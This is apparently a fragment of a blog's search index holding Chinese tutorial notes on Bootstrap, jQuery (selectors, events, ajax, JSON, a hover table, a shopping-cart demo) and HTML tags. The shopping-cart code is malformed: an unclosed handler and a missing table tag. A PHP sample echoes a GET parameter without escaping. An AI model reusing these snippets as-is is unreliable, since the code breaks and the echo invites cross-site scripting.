aria-labelledby=&quot;home-tab&quot;&gt; &lt;div class=&quot;row&quot; style=&quot;margin-top:10px;&quot;&gt; &lt;div class=&quot;col-md-2&quot; style=&quot;height:200px;&quot;&gt; &lt;a href=&quot;会员主页&quot;&gt; &lt;img class=&quot;img-circle&quot; src=&quot;图片路径&quot;style=&quot;width:80px; height: 80px;&quot; &gt; &lt;/a&gt; &lt;/div&gt; &lt;!--其他最新会员……--&gt; &lt;/div&gt; &lt;!--高分会员--&gt; 该示例代码中主要列出了“最新会员”的展示信息，其ID为newRegister,与其标签项的链接地址相同。其中每个会员信息占有的屏幕宽度为col-md-2(在右侧代码中为了满足屏幕尺寸需要改为col-xs-2),也就是每6个用户占据一行。 本课程内容转自：汇智网]]></content>
      <tags>
        <tag>BootStrap</tag>
        <tag>前端</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQuery学习笔记]]></title>
    <url>%2F2016%2F08%2F28%2FJQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JQuery是什么？ Jquery是一个基于javascript的框架，等于说把javascript封装了一下。需要在html中链接了JQuery的文件才能用，你查看源代码，就能看到链接Jquery的代码： &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;https://www.xxx/js/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt; 学JQuery跟学javascript有什么区别，是不是要精通javascript才能学JQuery? jquery是基于javascript，所以可以说写jquery脚本有一半是在写javascript，但jquery又有很多特性是它独有的。jquery是封装了javascript，是为了简化javascript脚本而存在，所以没必要精通javascript，javascript中很多的函数在jquery中都有更简单的替代方式。 开始入门吧 入门之前，先简单地看一下html+css+javascript的语法，再来看这篇文章，这会让你更好地理解代码。Jquery最大的特点是方便对DOM的封装。什么是DOM？DOM就是操作html文件的树结构的方法，我们看图片。 从这个图很明显的就能看出，实际上html文件中每一个标签都是一个节点，整个html文档组成了一棵树。 在javascript中，我们有一些函数可以访问这些节点，并对他们进行增加、删除、修改。比如，getElementById(xxx)就是获得id为xxx的对象，它可能就是一个div标签。我们用面向对象的思想来看，实际上获得的是一个id为xxx的div对象。这个对象实际上就是从&lt;div id=xxx&gt;到相应&lt;/div&gt;这所有的内容。 通过这个对象的相关方法就能很方便地直接操作html文件。 在Jquery中，DOM变得更加简单。 选择器 要操作html文档，就用到选择器。 举个很简单的例子，$(“div#exm”) 选择了id为exm的div元素。如下代码能让“测试1”这三个字通过点击按钮显示在html中： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).html(&quot;测试1&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;点击我&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 大家可以把代码放进http://www.w3school.com.cn/tiy/t.asp?f=html_basic运行，查看效果。 来分析一下这一小段Jquery代码。首先，$(document)，这个选择器选择的是整个文档。ready是一个事件，表示等整个文档加载完成后再运行这段javascript。一般Jquery的代码都放在这个块里面。$(“botton”)选择了文档中第一个，也就是按钮。click也是一个事件，表示当该按钮被点击后执行这里面的代码。$(“div#test”)就是选择的id=test的元素，对该元素执行方法html()，html方法就是读取或修改中的内容。（具体是读取还是修改要看具体情况，在我这里就是修改） 所以，点击了按钮后，&lt;div id=&quot;exm&quot;&gt;&lt;/div&gt;中就被加入了“测试1”三个字。 到此为止，我们一共接触到如下几个概念： 选择器：$(xxx) 事件：ready()、click() 文档操作方法：html() 大家应该就了解个大概了。通过Jquery，我们就可以操作html中任何标签内的任何内容。我来列举几个。 修改css 通过css方法可以操作css。比如如下代码： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).css(&quot;color&quot;, &quot;red&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;测试2&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 将刚才的代码改了一点，看这句话：$(“div#exm”).css(“color”, “red”); 将id=test的div元素的css样式color值改成red。我们点击了按钮后就能看到，“测试2”三个字变成了红色。 隐藏和显示和动画效果 Jquery自带了一些动画效果，通过一些参数就能显示出来。看如下代码 &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;button&quot;).click(function(){ $(&quot;div#test&quot;).hide(&apos;slow&apos;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt; &lt;div id=&quot;test&quot;&gt;测试3&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 点击了按钮后，“测试3”这三个字慢慢滑动离开了，很像幻灯片是吧？我也只是改了一句话：$(“div#exm”).hide(‘slow’); 将id=test的div元素隐藏，并且是慢慢隐藏，因为有’slow’参数。 hide方法就是隐藏一个元素所有内容的方法。它有一个参数，表示隐藏的快慢。 当然有hide方法就有show方法，用法一样。还有一个方法toggle，表示在隐藏和显示中切换。有这三个方法，我们很容易弹出一个菜单或让一个不要的内容消失，而且有动画效果。 当然，Jquery还支持更多动画效果，有很多方法，大家可以自己去探索。 改变元素大小 我们可以用Jquery的height()和width()方法改变一个元素的大小。这个工作也可以用css()方法完成。通过这个方法，我们可以动态改变我们网站的元素，来适应用户浏览器的分辨率。 更多事件：文本框获得、失去焦点 在很多网站填写表单的地方都用到了这个效果： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(&quot;:text&quot;).focus(function(){ $(&quot;:text&quot;).val(&quot;&quot;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input type=&quot;text&quot; value=&quot;请填写用户名&quot; style=&quot;color: #999;&quot;/&gt; &lt;/body&gt; &lt;/html&gt; 当鼠标点击输入框时“请填写用户名”这几个字消失掉。这就是focus事件，它表示某个控件获得焦点。看看代码，用到了一个选择器$(“:text”)，它表示所有type=text的input元素。当该元素获得焦点后，执行了val方法。这个方法就是改变input标签的value属性，也就是改变显示在文本框内的内容。 选择器详解和css语法 上面只提到了一个id选择器，选择id=xxx的某元素。其实Jquery的选择器可谓多种多样，对css比较熟悉的同学就很好学了，因为css的语法Jquery选择器基本都能用。 比如，css里面，定义一个类的样式的方法：.XXX{}，而在Jquery里选择一个class=XXX的元素的方法：$(“.XXX”)。 举一些常用的例子，详细的选择器说明在w3school里都有列出。 这只是我举的一些例子，基本上选择器Jquery和css类似，所以对css比较熟悉的人可以很快掌握Jquery的选择器语法，这也是Jquery流行的原因之一，很好学习，一通百通。 事件详解 在很多Jquery代码中，我们总是能看到是这样的形式： $(document).ready(function(){ //Jquery代码 }); 所有的代码被套在了最外层的ready中。我上次也提到了，ready是一个事件。我们上面说的选择器，它选择某元素的作用，其实就是为了完成后面的工作。看我们这个代码，$(document)选择的是document对象，这个对象学javascript应该很清楚，指的就是整个html文档。选在选在到了对象，这个对象有一个方法ready(); ready是一个事件。事件是什么概念，和很多编程一样，事件是由用户在执行相应的操作后自动触发的一个过程，我们可以给某事件绑定一个处理函数，当用户触发了这个事件后，就能执行我们绑定的函数。 ready()是一个事件绑定函数，它中间那个function(){}就是我们为ready事件绑定的函数。ready事件在对象加载完成后触发，我们前面选择的是document对象，所以这个ready就是指整个文档加载完成后触发的事件。 所以整段代码意思就是为document对象的ready事件添加响应函数function(){}，这个函数里面添加我们希望Jquery做的事情。当文档加载完成后，执行此函数，相当于执行我们的代码。 我列举一些Jquery中常用的事件及其绑定函数： click 鼠标点击事件 （最常用，当鼠标点击某对象时触发此函数） change 对象被改变（如input框中写入、修改、删除文字时触发此事件） focus 对象获得焦点（如光标进入textarea框触发此事件） blur 对象失去焦点（与focus事件相对） load 对象加载完成（如图像被加载完成时触发此事件） error 对象遇到错误 （如图像输入了一个错误的地址，没有成功加载） mousemove 鼠标移动 （当鼠标移动时触发此事件） 试试mousemove事件，运行这段代码： &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(document).mousemove(function(e){ $(&quot;span&quot;).text(e.pageX + &quot;, &quot; + e.pageY); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;鼠标位于坐标： &lt;span&gt;&lt;/span&gt;.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 可以看到，鼠标移动后就能输出当前鼠标所在的坐标。其中function有一个参数e，每个事件函数都有一个参数，这个参数就是指该事件本身。（当然这个参数可以省略），e.pageX和e.pageY就是指鼠标以后后鼠标所在的位置。 html操作详解 选择器的作用我说了，就是完成为了后面的操作。除了为选择到的对象添加一个事件响应函数外，还能直接操作此对象，这就是我们的html操作。 我也列举一些常用的html操作方法（更详细地在w3school中查看） 通过这些方法，我们能动态地对html页面进行操作。再结合ajax，就可以动态地向服务器请求内容，并在不刷新页面的情况下更新页面中一部分。 什么是ajax ajax指异步javascript。相信很多同学在百度百科里也看到了它的相关介绍，不过说的挺复杂，各种各样的专业术语。如果只是基础，我们这样理解ajax好了：利用ajax可以动态地以javascript的方式向服务器请求数据，并接受服务器发回的数据，这个过程浏览器可以做其他的任何工作，可以不离开页面，不刷新。 具体来说呢？我举个小例子，现在有一个注册表单，要用户填写用户名。一般都会有一个“检查是否已被占用”链接，用户点击链接后，浏览器打开一个新页面，向服务器发送一个请求，在数据库里咨询看用户名是否已存在，得到结果后返回到页面里提示用户。如果不用ajax，大家可以想象，点击了链接，浏览器势必要打开新页面，给用户带来不便。但是运用ajax，用户点击链接后，不打开新页面，而由javascript在后台向服务器获取结果，然后用一个提示框弹出提示用户，用户在这个过程中还可以继续填写表单，两个过程互不影响。页面不会跳转，也不会刷新，用户之前填写的内容不会丢失。 这就是所谓的异步，类似于多线程。 甚至我们做一个网站，放上背景音乐，网站中一切链接都由ajax完成（比如点击了一片文章，ajax向服务器请求文章内容，然后用我上次说的Jquery html操作将网页中的一部分进行修改，这样文章就放入了页面而并不刷新页面），这样我们的音乐就一直不会被刷新。 所以说ajax最大的优点，就是在不更新整个页面的情况下对部分内容进行修改、维护，这样服务器发送的数据少，减少了服务器的负担。 简单的ajax获取信息 来看看我们用Jquery怎么去结合ajax。 首先看看怎么获取服务器上一个txt文件：使用load()方法 (因为ajax使用同源策略，所以在哪个网站运行代码就只能请求该服务器上的内容，我请求的是w3school中的一个txt文件，大家把代码放在http://www.w3school.com.cn/tiy/t.asp?f=html_basic运行才能看到效果) &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt; &lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;#btn1&quot;).click(function(){ $(&apos;#test&apos;).load(&apos;http://www.w3school.com.cn/example/jquery/demo_test.txt&apos;); }) }) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h3 id=&quot;test&quot;&gt;请点击下面的按钮，通过 jQuery AJAX 改变这段文本。&lt;/h3&gt; &lt;button id=&quot;btn1&quot; type=&quot;button&quot;&gt;获得外部的内容&lt;/button&gt; &lt;/body&gt; &lt;/html&gt; 大家可以看到，点击按钮后文本被改变。这其中我请求的就是http://www.w3school.com.cn/example/jquery/demo_test.txt文件。看到Jquery代码，它为按钮绑定了click事件，点击按钮后，执行$(‘#test’).load(‘http://www.w3school.com.cn/example/jquery/demo_test.txt‘); 也就是请求这个文本文件内容，并将id=test的元素内容改变成请求到的文本。 这是最简单的ajax，简单地请求一个文本文件。最常见的，我们是向一个脚本，通过get或post请求一个html或json。 ajax使用get请求向服务器请求html内容 又回到我们开始的那个例子，判断用户名是否存在。 比如我们服务器上有这样一个文件nameexists.php: &lt;?php $name = $_GET[&apos;act&apos;]; /* * *在数据库中咨询用户名是否存在 * */ $re = true; //假设用户名存在 if($re){ echo &quot;用户名 $name 已存在&quot;; }else{ echo &quot;恭喜您，该用户名可以使用&quot;; } ?&gt; 然后我们浏览器表单如下： &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function sub(){ var name = $(&quot;#name&quot;).val(); $.get(&quot;nameexists.php&quot;, { &quot;act&quot;: name }, function(data, status){ if (status) {alert(data);} }); } &lt;/script&gt; &lt;form&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; /&gt; &lt;input type=&quot;button&quot; value=&quot;验证&quot; onclick=&quot;sub();&quot;/&gt; &lt;/form&gt; 大家试验即可看到，当点击“验证”后，弹出提示框 并没有刷新页面，我们填写的内容依旧在表单中。这就是向服务器请求了html，返回的“用户名…已存在”就是一个html文本，最后体现在用户面前。 我们看Jquery代码。这是一个javascript函数，当点击按钮时执行此函数。首先选择器选择了id=name的文本框，用val()方法获取其值，并赋值给name变量。 看后面，用到了get方法。这个方法是一个全局的方法，所以写成$.get，这个方法有三个参数：$.get(url, data, callback); url是我们要请求的地址，data是我们要传递的参数，写成{‘索引1’:’参数2’,’索引2’:’参数2’…}的形式，也可以把他们直接写在url后面: url?a=1&amp;b=2… （只适用于get请求）。第三个参数callback是一个回调函数，这个函数在获取到数据后运行，也就是说收到的数据可以在这个函数中处理。函数原型：function(data,status,xhr) data是获得的返回数据，status是状态（成功或失败），xhr是XMLHttpRequest对象（我这里用不上）。 所以大家可以看到，我直接把获得的返回数据data弹出来：alert(data)。而我们看到php，其实这个data就是echo输出的内容。 类似于get方式，post()方法参数都与get相同，我就不举例子了。这是获取的html内容，其实在javascript中，更多的是获取json，再通过javascript代码处理json来显示给我们用户看。 什么是json 又到了普及概念的时候。json是一种javascript原生的数据交换格式。 在互联网上，最普遍的就是数据交换。比如在QQ上，A向B发送一个数字，一个字母或一句话，来告诉B某些信息。但是数字、字符串很好传递，有些对象却并不那么容易传递，比如数组。我们怎么把一个数组对象通过QQ发送给别人？ 有些人就说，这很简单啊，在php里，不就是“array(1=&gt;’a’,2=&gt;’b’,3=&gt;’C’);”我就把这个字符串给B发送过去，B一看就知道数组是怎么构成的了。对，其实这就是一种数据交换格式，不过这仅仅是php里定义数组的语法，如果B不懂php，他也许就看不懂你给他发送是这个是什么意思。 所以就诞生了json和xml两种通用的数据交换格式。我不说xml也不比较二者，只来说说json。因为json是从javascript发展出来的，所以十分适合javascript。比如刚才的数组，用json写出来： { &quot;1&quot;: &quot;a&quot;, &quot;2&quot;: &quot;b&quot;, &quot;3&quot;: &quot;C&quot; } 这样的json能在任何javascript中被解析成一个json对象，我们可以通过json.xxx来得到相应内容。 ajax的json方法 Jquery中从服务器加载json数据的方法是：$.getJSON 它的参数与get()方法完全一样，但是服务器返回结果data应该是一个json格式的字符串（如果不是就出错）。 我说了json是一个通用的数据交换编码，所以在php里也有方法把对象处理成json字符串。在php5.2以上的版本，有了一对函数json_encode()和json_decode()，分别对php中对象进行json格式的编码和解码。 举个没什么营养的例子。 服务端： &lt;?php $arr = array(&apos;name&apos;=&gt;&apos;name&apos;, &apos;url&apos;=&gt;&quot;url&quot;, &apos;PR&apos;=&gt;0); echo json_encode($arr); ?&gt; 浏览器： &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function sub(){ $.getJSON(&quot;test2.php&quot;, function(data, status){ if (status){ $(&quot;div&quot;).html(data.name + &apos; | &apos; + data.url + &apos; | &apos; + data.PR); } }); } &lt;/script&gt; &lt;form&gt; &lt;div&gt;&lt;/div&gt; &lt;input type=&quot;button&quot; value=&quot;提交&quot; onclick=&quot;sub();&quot;/&gt; &lt;/form&gt; 大家可以试验，点击了按钮后，打印出了php中定义的数组内容。php端两行代码，定义了一个数组，并用json_encode把数组做成一个json编码的字符串输出。 再看Jquery代码，大家会发现，实际上获得的内容是一个对象，我们用点号访问对象中内容：data.name, data.url, data.PR. 这只是json的简单事例，没什么实用性。大家可以试想，假如图书馆有个图书检索系统，用户向服务器请求书名，服务器查询数据库后把所有符合条件图书信息做成一个二维数组，再用json形式发送给浏览器，Jquery把他们美化后输出，过程并不复杂。 一个鼠标移动上去就变换颜色的表格 &lt;html&gt; &lt;head&gt; &lt;title&gt;表格1&lt;/title&gt; &lt;style&gt; table.hovertable { font-size:13px; color:#333333; border-width: 1px; border-color: #999999; border-collapse: collapse; width: 100%; } table.hovertable th { background-color:#c3dde0; border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; text-align: left; } table.hovertable tr { background-color:#d4e3e5; } table.hovertable td { border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; } &lt;/style&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;.hovertable td&quot;).mouseover(function(event){ event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; }); $(&quot;.hovertable td&quot;).mouseout(function(event){ event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;; }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;table class=&quot;hovertable&quot;&gt; &lt;tr&gt;&lt;th&gt;标题&lt;/th&gt;&lt;th&gt;内容&lt;/th&gt;&lt;th&gt;时间&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;aaa&lt;/td&gt;&lt;td&gt;15:30&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;bbb&lt;/td&gt;&lt;td&gt;17:40&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;ccc&lt;/td&gt;&lt;td&gt;13:35&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;ddd&lt;/td&gt;&lt;td&gt;08:53&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 大家依旧是放到http://www.w3school.com.cn/tiy/t.asp?f=jquery_hide 运行，可以看到，当鼠标移动到相应的行上的时候，该行变色，当鼠标移走时，颜色恢复。 这个效果相信大家在很多地方见到过，我这里运用了Jquery和HTML DOM两种方法结合。这就是我要说的一个重点。 我们看Jquery代码：$(&quot;.hovertable td&quot;).mouseover，选择了class=hovertable的元素的td子元素，为他的mouseover事件绑定一个函数。td元素就是表格中的一个格子，mouseover事件指“鼠标移动到上面”。也就是说，当用户鼠标移动到每个格子上，都会触发这个事件，进而执行函数中的代码。 看到这个函数中的代码，event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; event是什么？我们可以看到，function(event)，所以event是这个事件绑定函数的一个参数，它指的就是“鼠标掠过”事件对象。 为什么要用这个event？因为我们可以看到，鼠标移动到某一行上，只有这一行的颜色会发生变化，我们必须知道鼠标移动到哪一行上了，所以必须获得这个event对象。 event对象有如下一些方法或属性： 大家可以看到，我用到的就是target属性，event.target指的就是触发mouseover事件的DOM元素，在这里就是td。 所以在函数中，我们得到了鼠标所在的元素。在这里，我来说一下我们获得的这个DOM对象。 在Jquery中，有对html操作的一些函数，比如$(xx).html()，获取某元素内的内容。而在单纯的javascript中，也有对html操作的DOM函数，比如xx.innerHTML，它也是获取某元素中的内容。而在实际运用中，这两种函数是不能互相使用的。比如我们一个Jquery对象：$(“div#test”)，它不能用$(&quot;div#test&quot;).innerHTML来获取内容，只能用$(&quot;div#test&quot;).html()来获取。 同样的，对于DOM对象event.target，也是不能使用Jquery的方法的。比如，有的同学直接使用event.target.css(&#39;background-color&#39;,&#39;red&#39;)，想这样更改它的背景颜色。这样浏览器是会报错的，错误是td对象不含有css方法。 所以大家可以看到，我使用的是DOM中的方法event.target.parentNode.style.backgroundColor，首先用parentNode获得td元素的父元素tr元素（因为我是要一行都改变颜色，而不是只让鼠标所在的格子改变颜色），再用style属性，改变tr元素的样式。这里说一下，style下面有很多属性，比如这里的backgroundColor是指css中的&#39;background-color&#39;，一般都是css中的名字，其中第二个单词首字母变成大写。 所以这句话也就是改变了tr的样式，将css中的background-color改成#F0FFFF。 第二个函数也一样，mouseout方法是指“鼠标离开”，如果鼠标移开，就把颜色改回以前的颜色。这样就完成了我们这个“变色表格”的制作。 一个选择商品系统 我们继续来强化刚才制作的这个表格。 &lt;html&gt; &lt;head&gt; &lt;title&gt;表格1&lt;/title&gt; &lt;style&gt; table.hovertable { font-size:13px; color:#333333; border-width: 1px; border-color: #999999; border-collapse: collapse; width: 100%; } table.hovertable th { background-color:#c3dde0; border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; text-align: left; } table.hovertable tr { background-color:#d4e3e5; } table.hovertable td { border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; } &lt;/style&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;.hovertable td&quot;).mouseover(function(event){ event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; }); $(&quot;.hovertable td&quot;).mouseout(function(event){ event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;; $(&quot;.hovertable td&quot;).click(function(event){ var name = $(event.target.parentNode).children(&quot;td:first&quot;).html(); var price = $(event.target.parentNode).children(&quot;td:last&quot;).html(); $(event.target.parentNode).remove(); $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;元&lt;/p&gt;&apos;); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;tr&gt;&lt;th width=&quot;40%&quot;&gt;商品&lt;/th&gt;&lt;th width=&quot;40%&quot;&gt;类别&lt;/th&gt;&lt;th&gt;价格&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;肥皂&lt;/td&gt;&lt;td&gt;日用品&lt;/td&gt;&lt;td&gt;5.5&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;拖把&lt;/td&gt;&lt;td&gt;清洁用品&lt;/td&gt;&lt;td&gt;25.0&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;硬盘&lt;/td&gt;&lt;td&gt;电子产品&lt;/td&gt;&lt;td&gt;450.0&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;酸奶&lt;/td&gt;&lt;td&gt;奶制品&lt;/td&gt;&lt;td&gt;9.9&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;苹果&lt;/td&gt;&lt;td&gt;水果&lt;/td&gt;&lt;td&gt;2.5&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;div id=&quot;buy&quot; style=&quot;border: 1px solid #999;margin-top: 10px;text-align: center;&quot;&gt; &lt;h4 style=&quot;color: red;&quot;&gt;购物车&lt;/h4&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 大家运行后可以看到，这次我做了一个类似网上购物时选购商品的页面： 每点击一个商品，我们就把这一行从表格中删除，并加到下方的“购物车”框中。其实改动并不大，表格还是刚才的表格，Jquery中增加了一个函数： $(&quot;.hovertable td&quot;).click(function(event){ var name = $(event.target.parentNode).children(&quot;td:first&quot;).html(); var price = $(event.target.parentNode).children(&quot;td:last&quot;).html(); $(event.target.parentNode).remove(); $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;元&lt;/p&gt;&apos;); }); 就是一个当某个格子被点击时，执行的代码。看第一行，我们会发现，event.target.parentNode我认识，但为什么要把它放在$()中间？ 这就涉及到DOM对象转换成Jquery对象的过程。大家用Jquery多了就会喜欢Jquery的简洁，但DOM对象并不能使用Jquery的方法，所以Jquery其实给了大家一个方式，能把DOM对象转换成Jquery对象，也就是把DOM对象直接放到$()中即可。 比如我们一般写的$(document).ready，其实就是把DOM对象document转换成了Jquery对象，使用Jquery的方法ready。 这里也一样，把event.target.parentNode转换成了Jquery的对象。后面一个children其实是Jquery下我没讲到的“遍历函数”。遍历函数其实就是遍历某个对象，比如我们一个table对象，要取其中每行的内容，就可以用each方法遍历。 children方法用的也很多，意思是取满足条件的某子元素。大家可以看到，children(“td:first”)，就是取第一个td元素。也就是这一行的第一个格子，再用html()取到其内容，保存到变量name里。 var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();也是一个道理，取最后一个格子内容。 于是这里就得到了我点击的这一行的商品名和价格。然后用$(event.target.parentNode).remove();把这一行移除，再用append把内容加到“购物车”里。就制成了这个简单的选购商品的页面。 本文内容转自：离别歌]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
        <tag>JQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML学习笔记]]></title>
    <url>%2F2016%2F08%2F26%2FHTML%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[超文本标记语言，标准通用标记语言下的一个应用。“超文本”就是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素。超文本标记语言的结构包括“头”部分（英语：Head）、和“主体”部分（英语：Body），其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。 HTML学习笔记 HTML 常用标签演示 本页演示的所有标签均为浏览器默认效果。【基础】&lt;div&gt; 定义文档中的节（块元素，无任何属性）&lt;span&gt; 定义文档中的节（内联元素，无任何属性）&lt;h1&gt; to &lt;h6&gt; 定义标题（通常使用粗体显示。注意：单个页面内最好只使用1个H1标签）H1 标题H2 标题H3 标题H4 标题H5 标题H6 标题&lt;p&gt; 定义段落&lt;hr&gt; 定义水平线（本页中的分割线均为 &lt;hr&gt; 标签）&lt;header&gt; 定义 section 或页面的头部&lt;footer&gt; 定义 section 或页面的尾部&lt;article&gt; 定义文章&lt;section&gt; 定义文档中的节&lt;aside&gt; 定义文档内容相关的内容&lt;nav&gt; 定义导航header 头部footer 尾部article 内容section 内容aside 内容nav 内容&lt;details&gt; 定义细节内容&lt;summary&gt; 定义 details 的标题All pages and graphics on this web site are the property of W3School.HTML 5This document teaches you everything you have to learn about HTML 5.【列表】&lt;ul&gt; 定义无序列表（通常列表前会有项目符号） &lt;li&gt; 定义列表的项目 张三 李四&lt;ol&gt; 定义有序列表。（通常列表前会有数字符号） &lt;li&gt; 定义列表的项目 张三 李四&lt;dl&gt; 定义定义列表 &lt;dt&gt; 定义定义列表中的项目 &lt;dd&gt; 定义定义列表中项目的描述 CF穿越火线 CF是一个很好玩的游戏啊，一般人玩不了..【表格】&lt;table&gt; 定义表格&lt;caption&gt; 定义表格标题&lt;thead&gt; 定义表格中的表头内容&lt;tfoot&gt; 定义表格中的表注内容（脚注）&lt;tbody&gt; 定义表格中的主体内容&lt;tr&gt; 定义表格中的行&lt;th&gt; 定义表格中的表头单元格（通常使用粗体显示）&lt;td&gt; 定义表格中的单元 table 结构标准顺序如下：&lt;table&gt; &lt;caption&gt;&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;※ 虽然 tfoot 放在了 tbody 之前，浏览器依然会将 tfoot 显示在 tbody 之后，而且这样做能让浏览器在获得所有表格内的数据前显示表注。 表格标题 表头 ID 表头 姓名 表头 日期 表注 这是编号 表注 这是假名 表注 这是添加日期 1 张三 2019-09-09 2 李四 2016-6-6 自带边框样式 表头 ID 表头 姓名 表头 日期 表注 这是编号 表注 这是假名 表注 这是添加日期 1 张三 20019-09-09 2 李四 2016-6-6 【表单】 &lt;form&gt; 定义表单&lt;fieldset&gt; 定义围绕表单中元素的边框（通常四周会有缩进，并显示围绕的边框）&lt;legend&gt; 定义 fieldset 元素的标题 标题 内容&lt;select&gt; 定义选择列表（下拉列表、多选列表）&lt;optgroup&gt; 定义选择列表中相关选项的组合&lt;option&gt; 定义选择列表中的选项 张三 张三的儿子 张三的孙女 李四 李四的女儿 李四的孙子 滚动列表形式 张三 张三的儿子 张三的孙女 李四 李四的女儿 李四的孙子 多选列表 张三 张三的儿子 张三的孙女 李四 李四的女儿 李四的孙子 &lt;input&gt; 定义输入控件（如果浏览器不支持 HTML5 新的类型，那么会使用文本域替代）文本域 type=”text” 密码域 type=”password” 复选框 type=”checkbox” A B C单选按钮 type=”radio” 组A:① ② 组B:Ⅰ Ⅱ文件域 type=”file” 图像域 type=”image” （可用做提交按钮）隐藏域 type=”hidden” （当然是看不见的了）普通按钮 type=”button” 重置按钮 type=”reset” 提交按钮 type=”submit” email 域 type=”email” 